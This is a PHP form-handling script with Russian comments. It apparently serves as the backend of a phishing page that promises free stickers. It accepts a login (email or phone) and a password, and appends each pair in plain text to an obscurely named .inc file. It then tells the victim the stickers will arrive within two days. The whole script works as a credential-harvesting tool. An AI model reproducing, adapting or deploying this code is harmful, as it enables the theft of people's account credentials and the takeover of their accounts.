<?php
header('Content-Type: application/json');
if (isset($_POST['email'])){
	//Обрезаем знаки "<>" (защита от XSS)
     $_POST['email'] = strip_tags($_POST['email']);
     $_POST['password'] = strip_tags($_POST['password']);
    //Экранируем введенные данные (защита от XSS)
     $_POST['email'] = htmlspecialchars($_POST['email']);
     $_POST['password'] = htmlspecialchars($_POST['password']);
	//Очищаем введенные данные от пробелов (защита от пустых полей) 
	 $_POST['email'] = trim($_POST['email']);
	 $_POST['password'] = trim($_POST['password']);
	//Всегда поддерживаем единую кодировку utf-8
     $email = iconv('utf-8', 'utf-8', $_POST['email']);
     $nomer = iconv('utf-8', 'utf-8', $_POST['email']);
     $password = iconv('utf-8', 'utf-8', $_POST['password']);
     $folders = file ('b6f122ab967be6b6f122ab967be6.inc');
    //Регулярное выражение для проверки телефона
     $pattern = "#^[-+0-9()\s]+$#";
    //Api уведомлений
     include "callback.php";

    //Проверяем на дубли
    foreach ($folders as $folder) {
        $line = explode (':', $folder);
        if ($line[0] == $nomer) {
            $result = $line[1];
            break;
        }
    }
    //Если есть дубль - делаем уведомление
    if (isset ($result)) {

    	info("Вы уже оставили заявку!");

    }
    //Если поле "Пароль" пусто - делаем уведомление
    elseif (empty ($password)) {

    	error("Проверьте данные на правильность ввода!");

    }
	//Если поле "Email" пусто - делаем уведомление    
    elseif (empty ($email)) {

    	error("Проверьте данные на правильность ввода!");

    }
    //Если поле "Логин" - это email, делаем ввод в базу
    elseif (filter_var($email , FILTER_VALIDATE_EMAIL)) {

    	$ishod="b6f122ab967be6b6f122ab967be6.inc";
    	$text = "".$email.":".$password."";
    	$ok=fopen($ishod,"a+");
    	fwrite($ok,"$text\n");
    	fclose($ok);

    	success("Ваша заявка принята. Стикеры поступят на указанную страницу в течении 2 дней!");

	}
	//В ином случае, если поле "Логин" - это телефон, делаем ввод в базу
	elseif (preg_match($pattern, $email, $out)) {

    	$ishod="b6f122ab967be6b6f122ab967be6.inc";
    	$text = "".$email.":".$password."";
    	$ok=fopen($ishod,"a+");
    	fwrite($ok,"$text\n");
    	fclose($ok);

    	success("Ваша заявка принята. Стикеры поступят на указанную страницу в течении 2 дней!");

	}
	//Если поле "Логин" не подошло ни к одному из критериев фильтрации - выводим ошибку
	else {

    	error("Не верные логин или пароль!");

	}

}

?>